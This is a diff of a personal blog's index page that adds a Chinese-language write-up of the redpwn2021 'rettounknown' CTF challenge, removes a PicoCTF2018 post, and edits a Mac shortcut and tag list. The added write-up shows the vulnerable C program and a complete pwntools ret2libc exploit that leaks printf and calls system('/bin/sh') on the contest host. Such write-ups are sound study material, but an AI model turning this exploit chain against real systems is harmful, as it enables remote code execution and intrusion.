@@ -133,6 +133,104 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-redpwn2021" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/12/redpwn2021/">redpwn2021</a>
+    </h1>
+  
+
+        
+        <a href="/2021/08/12/redpwn2021/" class="archive-article-date">
+  	<time datetime="2021-08-13T03:39:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="redpwn2021-writeup"><a href="#redpwn2021-writeup" class="headerlink" title="redpwn2021 writeup"></a><strong>redpwn2021 writeup</strong></h1><p>就放两道自己做出来并且值得写一下的题把</p>
+<h2 id="pwn-rettounknow"><a href="#pwn-rettounknow" class="headerlink" title="pwn - rettounknow"></a>pwn - rettounknow</h2><p>这就是一道经典的libc基地址每次运行都会变的ret2libc</p>
+<p>首先，通过这道题我学到了下面几点：</p>
+<ul>
+<li>动态连接库在一个process的virtual address space setup的时候会被全部载入到内存中的，因为shared library之所以叫shared library就是它可能会被多个进程share，所以它是会被完整载入内存的。并且会被完整载入每个进程的virtual address space，并且库内相对地址一般不变。所以在这道题里，完全可以通过一个printf函数地址了解库里其它任何一个东西在此进程空间中的地址</li>
+<li>objdump dump一个动态链接库是dump不全，并不能反映动态链接库的真实layout</li>
+<li>gdb里 info shared_libraries 也不能完整显示shared library layout</li>
+<li>gdb里 想看真正的内存中各段地址信息要用info proc map</li>
+<li>pie enable就是会修改每次virtual address space的初始地址</li>
+</ul>
+<p>然后看下这道题的源程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> your_reassuring_and_comforting_we_will_arrive_safely_in_libc[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;that board meeting was a *smashing* success! rob loved the challenge!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;in fact, he loved it so much he sponsored me a business trip to this place called &#x27;libc&#x27;...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;where is this place? can you help me get there safely?&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// please i cant afford the medical bills if we crash and segfault</span></span><br><span class="line">  gets(your_reassuring_and_comforting_we_will_arrive_safely_in_libc);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;phew, good to know. shoot! i forgot!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;rob said i&#x27;d need this to get there: %llx\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good luck!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>之后思路就很清晰了：</p>
+<ol>
+<li>开始交互后，第一次输入先用main函数地址覆盖返回地址</li>
+<li>获得打印的printf函数地址之后，由于main函数覆盖了返回地址，再次进行交互</li>
+<li>这次利用获得的printf地址，我们可以获得下面几个东西：<ul>
+<li>system函数地址</li>
+<li>字符串”/bin/sh”地址</li>
+</ul>
+</li>
+<li>再去找gadget “pop rdi; ret”在application中的地址</li>
+<li>第二次的输入就是，gadget地址覆盖返回地址，接字符串地址，再接system地址，就完事了</li>
+</ol>
+<p>上代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">vuln = ELF(&#x27;ret2the-unknown&#x27;)</span><br><span class="line"># .so同样是ELF，所以同样可以用ELF函数</span><br><span class="line">libc = ELF(&#x27;libc-2.28.so&#x27;)</span><br><span class="line"># ROP参数是一个ELF函数返回值</span><br><span class="line">rop = ROP(vuln)</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot;*40 + p64(vuln.symbols[&#x27;main&#x27;])</span><br><span class="line"><span class="meta"># print(payload)</span></span><br><span class="line"></span><br><span class="line">p = remote(&#x27;mc.ax&#x27;, 31568)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#x27;there: &#x27;)</span><br><span class="line">printf_addr_str = p.recvuntil(&#x27;\n&#x27;).replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"># 直接用.symbols获取<span class="built_in">printf</span>函数相对libc头的地址</span><br><span class="line">original_printf_addr_int = libc.symbols[&#x27;printf&#x27;]</span><br><span class="line">printf_addr_int = <span class="keyword">int</span>(printf_addr_str, <span class="number">16</span>)</span><br><span class="line"># 求得libc在内存中的起始地址</span><br><span class="line">libc.address = printf_addr_int - original_printf_addr_int</span><br><span class="line"></span><br><span class="line"># 很方便通过把libc起始地址设好，直接获得system函数和字符串在内存中的地址</span><br><span class="line">system_addr_int = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh_addr_int = next(libc.search(b<span class="number">&#x27;</span>/bin/sh<span class="number">&#x27;</span>))</span><br><span class="line"></span><br><span class="line"># 通过rop库获得gadget地址</span><br><span class="line">poprdi_addr_int = rop.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;])[0]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(poprdi_addr_int)</span><br><span class="line">payload += p64(binsh_addr_int)</span><br><span class="line">payload += p64(system_addr_int)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/12/redpwn2021/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-程序员赶due懒人自助理发法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -241,7 +339,7 @@
         <h2 id="Mac-OS-shortcuts"><a href="#Mac-OS-shortcuts" class="headerlink" title="Mac OS shortcuts"></a>Mac OS shortcuts</h2><ul>
 <li>cmd + c, cmd + v copy and paste</li>
 <li>cmd + shift +c, cmd + shift + v, terminal copy and paste</li>
-<li>cmd + delete, delete a file, cmd + shift + cmd empty trash</li>
+<li>cmd + delete, delete a file, cmd + shift + delete empty trash</li>
 <li>cmd + t, cmd + n, open another window for an application</li>
 <li>cmd + space, input terminal, open a terminal</li>
 <li>cmd + ctrl + F, full screen or exit full screen</li>
@@ -905,82 +1003,6 @@
 
 
   
-    <article id="post-PicoCTF2018-Binary-Exploitation" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/13/PicoCTF2018-Binary-Exploitation/">PicoCTF2018 Binary Exploitation and some other interestings</a>
-    </h1>
-  
-
-        
-        <a href="/2021/01/13/PicoCTF2018-Binary-Exploitation/" class="archive-article-date">
-  	<time datetime="2021-01-14T00:22:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="leak-me"><a href="#leak-me" class="headerlink" title="leak-me"></a>leak-me</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">48</span>];</span><br><span class="line">  FILE *file;</span><br><span class="line">  file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(flag, <span class="keyword">sizeof</span>(flag), file);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// real pw: </span></span><br><span class="line">  FILE *file;</span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">256</span>];</span><br><span class="line">  <span class="keyword">char</span> password_input[<span class="number">64</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(password, <span class="number">0</span>, <span class="keyword">sizeof</span>(password));</span><br><span class="line">  <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="keyword">sizeof</span>(name));</span><br><span class="line">  <span class="built_in">memset</span>(password_input, <span class="number">0</span>, <span class="keyword">sizeof</span>(password_input));</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What is your name?\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  fgets(name, <span class="keyword">sizeof</span>(name), <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">char</span> *end = <span class="built_in">strchr</span>(name, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (end != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    *end = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcat</span>(name, <span class="string">&quot;,\nPlease Enter the Password.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  file = fopen(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(password, <span class="keyword">sizeof</span>(password), file);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(name);</span><br><span class="line"></span><br><span class="line">  fgets(password_input, <span class="keyword">sizeof</span>(password_input), <span class="built_in">stdin</span>);</span><br><span class="line">  password_input[<span class="keyword">sizeof</span>(password_input)] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password_input, password)) &#123;</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Incorrect Password!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2021/01/13/PicoCTF2018-Binary-Exploitation/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/13/PicoCTF2018-Binary-Exploitation/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next</a>
@@ -1070,15 +1092,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Leetcode</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Research</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Reverse Engineering</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1086,7 +1100,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Leetcode</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Review</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Reverse Engineering</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1094,19 +1116,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Security Test</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">leetcode</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">misc</a>
+                <a href="javascript:void(0)" class="js-tag color4">Security Test</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">misc</a>
               </li>
             
             <div class="clearfix"></div>
